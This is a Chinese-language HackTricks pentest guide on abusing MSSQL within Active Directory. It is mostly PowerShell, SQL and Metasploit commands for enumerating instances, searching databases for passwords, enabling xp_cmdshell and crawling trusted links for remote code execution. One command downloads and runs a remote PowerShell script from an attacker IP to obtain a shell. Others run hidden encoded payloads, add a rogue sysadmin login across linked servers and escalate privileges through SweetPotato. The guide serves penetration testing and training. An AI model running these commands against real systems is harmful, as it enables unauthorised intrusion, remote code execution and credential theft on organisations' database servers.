# MSSQL AD 滥用

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要在 HackTricks 上看到您的**公司广告**？ 或者想要访问**PEASS 的最新版本或下载 HackTricks 的 PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享您的黑客技巧**。

</details>

## **MSSQL 枚举 / 发现**

在这种情况下，PowerUpSQL PowerShell 模块非常有用。
```powershell
Import-Module .\PowerupSQL.psd1
```
### 无需域会话从网络枚举
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### 从域内进行枚举
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL基本滥用

### 访问数据库
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

可能还可以在 MSSQL 主机内部执行命令
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL基本黑客技巧

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL信任链接

如果一个MSSQL实例被另一个MSSQL实例信任（数据库链接）。如果用户对受信任的数据库有特权，他将能够**利用信任关系在另一个实例中执行查询**。这些信任关系可以被链接在一起，最终用户可能会找到一些配置不当的数据库，从而能够执行命令。

**数据库之间的链接甚至可以跨越森林信任。**

### Powershell滥用
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

您可以使用Metasploit轻松检查受信任的链接。
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
注意，metasploit 将尝试仅滥用 MSSQL 中的 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，则需要手动尝试 `EXECUTE` 方法来执行命令，详见下文。）

### 手动 - Openquery()

从 **Linux** 中，您可以使用 **sqsh** 和 **mssqlclient.py** 获得 MSSQL 控制台 shell。

从 **Windows** 中，您还可以找到链接，并使用类似 **HeidiSQL** 的 **MSSQL 客户端** 手动执行命令。

_使用 Windows 身份验证登录：_

![](<../../.gitbook/assets/image (167) (1).png>) 

#### 查找可信链接
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (168).png>)

#### 在可信链接中执行查询

通过链接执行查询（例如：在新可访问实例中查找更多链接）：
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
检查双引号和单引号的使用方式，以确保使用正确。
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

您可以手动无限延续这些受信任的链接链。
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### 手动 - EXECUTE

您还可以使用`EXECUTE`来滥用受信任的链接：
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## 本地权限提升

**MSSQL本地用户**通常具有一种特殊特权，称为**`SeImpersonatePrivilege`**。这允许该帐户在身份验证后“模拟客户端”。

许多作者提出的一种策略是强制**SYSTEM服务**对攻击者创建的恶意或中间人服务进行身份验证。然后，这个恶意服务能够在SYSTEM服务尝试进行身份验证时冒充SYSTEM服务。

[SweetPotato](https://github.com/CCob/SweetPotato)收集了这些各种技术，可以通过Beacon的`execute-assembly`命令执行。
